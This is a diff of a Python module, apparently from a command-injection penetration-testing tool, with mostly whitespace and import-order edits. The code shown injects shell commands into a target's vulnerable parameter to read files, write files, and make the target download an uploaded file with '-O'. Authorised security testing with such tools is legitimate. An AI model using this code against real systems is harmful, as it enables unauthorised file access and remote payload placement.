@@ -20,8 +20,8 @@ import urllib2
 
 from src.utils import menu
 from src.utils import settings
-from src.thirdparty.colorama import Fore, Back, Style, init
 
+from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
 
 """
@@ -36,7 +36,7 @@ def do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_param
     file_to_read = menu.options.file_read
     # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     if shell:
@@ -48,8 +48,7 @@ def do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_param
     else:
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
      sys.stdout.flush()
-     
-     
+       
   #  Write file
   if menu.options.file_write:
     file_to_write = menu.options.file_write
@@ -83,13 +82,13 @@ def do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_param
     
     # Execute command
     cmd = settings.FILE_WRITE + " '"+ content + "' "
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_write + ")"
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
     if shell:
@@ -131,13 +130,13 @@ def do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_param
     
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
     
     ## Check if file exists!
     cmd = "echo $(ls " + dest_to_upload + ")"
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
     if shell:
